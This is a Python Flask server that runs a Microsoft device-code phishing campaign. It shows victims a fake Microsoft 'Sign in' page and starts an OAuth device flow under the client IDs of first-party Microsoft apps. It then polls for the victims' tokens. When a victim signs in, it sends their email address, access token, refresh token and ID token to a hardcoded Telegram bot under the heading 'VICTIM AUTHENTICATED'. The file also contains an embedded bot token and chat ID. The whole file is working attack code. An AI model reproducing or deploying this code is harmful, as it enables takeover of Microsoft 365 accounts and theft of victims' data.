import os
import time
import uuid
import json
import base64
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Config ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

DB_PATH = "/tmp/phish.db"

CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "ab9b8c07-8f02-4f72-90fa-0fc6e3df3b70",  # OneDrive
]
SCOPES = "openid profile offline_access https://graph.microsoft.com/.default"
TENANT = "common"

# --- DB ---
db_lock = threading.Lock()

def init_db():
    with db_lock:
        con = sqlite3.connect(DB_PATH)
        con.row_factory = sqlite3.Row
        con.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                sid TEXT PRIMARY KEY,
                device_code TEXT,
                user_code TEXT,
                client_id TEXT,
                interval INTEGER,
                status TEXT,
                email TEXT,
                notified INTEGER DEFAULT 0,
                created_at REAL
            )
        """)
        con.commit()
        con.close()

def db_exec(sql, params=()):
    with db_lock:
        con = sqlite3.connect(DB_PATH)
        con.row_factory = sqlite3.Row
        con.execute(sql, params)
        con.commit()
        con.close()

def db_query(sql, params=()):
    with db_lock:
        con = sqlite3.connect(DB_PATH)
        con.row_factory = sqlite3.Row
        rows = con.execute(sql, params).fetchall()
        con.close()
        return [dict(r) for r in rows]

init_db()

# --- Telegram ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        print(f"[TELEGRAM] status={resp.status_code} body={resp.text[:200]}")
        if resp.status_code != 200:
            # fallback: plain text (HTML parse errors)
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"[TELEGRAM] EXCEPT: {e}")

# --- Device flow ---
def initiate_device_flow():
    for cid in CLIENT_IDS:
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
                data={"client_id": cid, "scope": SCOPES},
                timeout=15,
            )
            if resp.status_code == 200:
                d = resp.json()
                return d, cid
            print(f"[FLOW] client {cid} failed: {resp.status_code} {resp.text[:150]}")
        except Exception as e:
            print(f"[FLOW] client {cid} EXCEPT: {e}")
    return None, None

def decode_email(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (4 - len(payload) % 4)
        info = json.loads(base64.urlsafe_b64decode(payload))
        return info.get("preferred_username") or info.get("upn") or info.get("email") or "Unknown"
    except Exception:
        return "Unknown"

POLLERS = {}          # sid -> Thread
pollers_lock = threading.Lock()

def poll_loop(sid, device_code, interval):
    print(f"[POLL] running sid={sid}")
    deadline = time.time() + 900
    while time.time() < deadline:
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
                data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "client_id": _client_id_of(sid),
                    "device_code": device_code,
                },
                timeout=15,
            )
            result = resp.json()
            err = result.get("error")
            print(f"[POLL] sid={sid} status={resp.status_code} error={err}")
            if resp.status_code == 200:
                email = decode_email(result.get("id_token", ""))
                msg = (
                    f"<b>🔥 VICTIM AUTHENTICATED</b>\n\n"
                    f"<b>Email:</b> <code>{email}</code>\n"
                    f"<b>SID:</b> <code>{sid}</code>\n\n"
                    f"<b>ACCESS TOKEN:</b>\n<code>{result.get('access_token','')}</code>\n\n"
                    f"<b>REFRESH TOKEN:</b>\n<code>{result.get('refresh_token','')}</code>\n\n"
                    f"<b>ID TOKEN:</b>\n<code>{result.get('id_token','')}</code>"
                )
                send_telegram(msg)
                db_exec("UPDATE sessions SET status='completed', email=?, notified=1 WHERE sid=?", (email, sid))
                print(f"[POLL] SUCCESS sid={sid} email={email}")
                with pollers_lock:
                    POLLERS.pop(sid, None)
                return
            elif err == "authorization_pending":
                time.sleep(interval)
            elif err == "slow_down":
                interval += 5
                time.sleep(interval)
            else:
                print(f"[POLL] FATAL sid={sid} error={err} desc={result.get('error_description','')}")
                db_exec("UPDATE sessions SET status=? WHERE sid=?", (err or "error", sid))
                with pollers_lock:
                    POLLERS.pop(sid, None)
                return
        except Exception as e:
            print(f"[POLL] EXCEPT sid={sid}: {e}")
            time.sleep(5)
    db_exec("UPDATE sessions SET status='expired' WHERE sid=?", (sid,))
    print(f"[POLL] EXPIRED sid={sid}")
    with pollers_lock:
        POLLERS.pop(sid, None)

def _client_id_of(sid):
    rows = db_query("SELECT client_id FROM sessions WHERE sid=?", (sid,))
    return rows[0]["client_id"] if rows else CLIENT_IDS[0]

def start_poller(sid, device_code, interval):
    with pollers_lock:
        t = POLLERS.get(sid)
        if t and t.is_alive():
            print(f"[POLL] already running sid={sid}")
            return
        thread = threading.Thread(target=poll_loop, args=(sid, device_code, interval), daemon=True)
        POLLERS[sid] = thread
    thread.start()
    print(f"[POLL] spawned sid={sid}")

# --- Routes ---
PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;width:400px;max-width:92vw;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.code{background:#f2f2f2;border:1px solid #ccc;padding:12px;font-size:24px;font-weight:600;text-align:center;letter-spacing:2px;cursor:pointer;margin:16px 0}
.btn{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer}
</style></head>
<body><div class="card">
<h2>Sign in</h2>
<p>Enter this code at <b>https://microsoft.com/devicelogin</b></p>
<div class="code" onclick="navigator.clipboard.writeText('{{ user_code }}').then(function(){location.href='https://microsoft.com/devicelogin';});">{{ user_code }}</div>
<button class="btn" onclick="navigator.clipboard.writeText('{{ user_code }}').then(function(){location.href='https://microsoft.com/devicelogin';});">Copy code & continue</button>
</div></body></html>"""

@app.route("/")
def index():
    flow, cid = initiate_device_flow()
    if not flow:
        return "Service temporarily unavailable", 500
    sid = str(uuid.uuid4())
    db_exec(
        "INSERT INTO sessions (sid, device_code, user_code, client_id, interval, status, created_at) VALUES (?,?,?,?,?,?,?)",
        (sid, flow["device_code"], flow["user_code"], cid, flow.get("interval", 5), "pending", time.time()),
    )
    print(f"[FLOW OK] sid={sid} client={cid} user_code={flow['user_code']}")
    start_poller(sid, flow["device_code"], flow.get("interval", 5))
    return render_template_string(PAGE, user_code=flow["user_code"])

@app.route("/test-telegram")
def test_telegram():
    send_telegram("<b>✅ Test message from outlook-verify</b>")
    return "Test sent — check Telegram."

@app.route("/healthz")
def healthz():
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
